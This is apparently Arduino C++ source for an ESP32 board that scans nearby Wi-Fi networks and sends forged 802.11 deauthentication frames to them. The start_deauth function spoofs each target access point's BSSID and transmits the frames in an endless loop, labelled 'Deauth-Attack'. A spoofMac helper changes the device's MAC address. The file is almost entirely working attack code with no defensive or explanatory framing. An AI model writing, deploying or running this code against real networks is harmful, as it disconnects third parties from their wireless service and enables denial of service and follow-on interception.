#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>
#include <WiFiGeneric.h>
#include <WiFiMulti.h>
#include <WiFiSTA.h>
#include <WiFiScan.h>
#include <WiFiServer.h>
#include <WiFiType.h>
#include <WiFiUdp.h>

#include "esp_wifi.h"
#include "bypass.h"

#define MAX_NETWORKS 10

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

//struct network beacon packet
void scanForNetworks(_Network * networks){

  int numberOfNetworks = WiFi.scanNetworks();

  if(numberOfNetworks>0){

    for(int i = 0; i<MAX_NETWORKS && i<numberOfNetworks; i++){

      _Network net;
      net.ssid = WiFi.SSID(i);
      for(int j = 0; j<6; j++){

        net.bssid[j] = WiFi.BSSID(i)[j];

      }

      net.ch = WiFi.channel(i);

      networks[i] = net;
    }

  }

}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void start_deauth(_Network wifi) {

  deauth_frame_t deauthPacket;

  deauthPacket.reason = 5;

  Serial.println("Starting Deauth-Attack on network");
  Serial.println(wifi.ssid);

  WiFi.softAP(wifi.ssid, "", wifi.ch);
  memcpy(deauthPacket.access_point, wifi.bssid, 6);
  memcpy(deauthPacket.sender, wifi.bssid, 6);
  esp_wifi_set_promiscuous(true);

  while(true){

    esp_wifi_80211_tx(WIFI_IF_AP, &deauthPacket, sizeof(deauthPacket), false);

  }

}

bool spoofMac(uint8_t mac[]){

  esp_wifi_stop();  // Ferma Wi-Fi prima di cambiare MAC
  esp_err_t result = esp_wifi_set_mac(WIFI_IF_AP, mac);
  esp_wifi_start(); // Riavvia il Wi-Fi

  return (result == ESP_OK) ? true : false;

}